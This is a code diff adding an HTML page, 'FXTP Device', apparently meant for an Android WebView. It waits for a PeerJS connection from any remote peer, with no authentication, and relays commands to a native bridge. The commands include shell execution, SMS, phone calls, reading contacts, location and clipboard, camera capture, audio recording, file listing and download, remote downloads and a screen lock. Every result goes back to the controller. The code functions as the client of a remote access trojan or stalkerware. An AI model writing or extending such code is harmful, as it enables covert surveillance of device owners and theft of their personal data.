@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>FXTP Device</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { background: #0a0a12; color: #e0e0ff; font-family: monospace; padding: 20px; text-align: center; }
+        .id { font-size: 18px; margin: 20px 0; background: #1a1a2e; padding: 12px; border-radius: 8px; }
+        .status { color: #4caf50; }
+        .waiting { color: #ffb74d; }
+    </style>
+</head>
+<body>
+    <h1>⚡ FXTP Device</h1>
+    <div class="id" id="peerId">Initializing...</div>
+    <div id="status" class="waiting">Waiting for connection...</div>
+
+    <script>
+        let peer = null;
+        let connection = null;
+
+        function updateStatus(connected) {
+            const el = document.getElementById('status');
+            if (connected) {
+                el.textContent = '✅ Connected';
+                el.className = 'status';
+            } else {
+                el.textContent = '⏳ Waiting for connection...';
+                el.className = 'waiting';
+            }
+        }
+
+        function log(msg) {
+            console.log('[Device] ' + msg);
+        }
+
+        function callBridge(method, arg) {
+            if (typeof AndroidBridge !== 'undefined') {
+                if (typeof AndroidBridge[method] === 'function') {
+                    let result;
+                    if (arg !== undefined) {
+                        result = AndroidBridge[method](arg);
+                    } else {
+                        result = AndroidBridge[method]();
+                    }
+                    // Send result back if it's a string (non-void)
+                    if (result !== undefined && connection) {
+                        connection.send({ type: method + '_result', value: result });
+                    }
+                } else {
+                    log('Method not found: ' + method);
+                    if (connection) connection.send({ type: 'error', value: 'Method not found: ' + method });
+                }
+            } else {
+                log('Bridge not available.');
+                if (connection) connection.send({ type: 'error', value: 'Bridge not available' });
+            }
+        }
+
+        function handleCommand(data) {
+            log('Received command: ' + data.type);
+            switch (data.type) {
+                case 'screenshot':
+                    callBridge('takeScreenshot');
+                    break;
+                case 'start_mirror':
+                    callBridge('startMirror');
+                    break;
+                case 'stop_mirror':
+                    callBridge('stopMirror');
+                    break;
+                case 'shell':
+                    callBridge('runShell', data.value);
+                    break;
+                case 'launch_app':
+                    callBridge('launchApp', data.value);
+                    break;
+                case 'list_files':
+                    callBridge('listFiles', data.value);
+                    break;
+                case 'download_file':
+                    callBridge('downloadFile', data.value);
+                    break;
+                case 'notification':
+                    callBridge('sendNotification', data.value);
+                    break;
+                case 'clipboard':
+                    callBridge('setClipboard', data.value);
+                    break;
+                case 'get_clipboard':
+                    callBridge('getClipboard');
+                    break;
+                case 'sms':
+                    callBridge('sendSms', data.value);
+                    break;
+                case 'contacts':
+                    callBridge('getContacts');
+                    break;
+                case 'location':
+                    callBridge('getLocation');
+                    break;
+                case 'camera':
+                    callBridge('captureCamera');
+                    break;
+                case 'audio':
+                    callBridge('startAudioRecording', data.value || 10);
+                    break;
+                case 'device_info':
+                    callBridge('getDeviceInfo');
+                    break;
+                case 'packages':
+                    callBridge('getPackages');
+                    break;
+                case 'wifi':
+                    callBridge('scanWifi');
+                    break;
+                case 'flashlight':
+                    callBridge('toggleFlashlight', data.value);
+                    break;
+                case 'vibrate':
+                    callBridge('vibrate', data.value);
+                    break;
+                case 'brightness':
+                    callBridge('setBrightness', data.value);
+                    break;
+                case 'volume':
+                    callBridge('setVolume', data.value);
+                    break;
+                case 'download_url':
+                    callBridge('downloadFromUrl', data.value);
+                    break;
+                case 'call':
+                    callBridge('makeCall', data.value);
+                    break;
+                case 'lock':
+                    callBridge('startLockScreen');
+                    break;
+                case 'html':
+                    callBridge('displayHtml', data.value);
+                    break;
+                default:
+                    log('Unknown command: ' + data.type);
+                    if (connection) connection.send({ type: 'error', value: 'Unknown command: ' + data.type });
+            }
+        }
+
+        function initPeer() {
+            peer = new Peer();
+            peer.on('open', (id) => {
+                document.getElementById('peerId').textContent = 'Peer ID: ' + id;
+                log('Peer ready: ' + id);
+            });
+            peer.on('connection', (conn) => {
+                connection = conn;
+                updateStatus(true);
+                log('Device connected!');
+                conn.on('data', (data) => {
+                    log('Received: ' + JSON.stringify(data));
+                    handleCommand(data);
+                });
+                conn.on('close', () => {
+                    updateStatus(false);
+                    log('Disconnected.');
+                    connection = null;
+                });
+            });
+            peer.on('error', (err) => {
+                log('Peer error: ' + err.message);
+            });
+        }
+
+        initPeer();
+    </script>
+</body>
+</html>
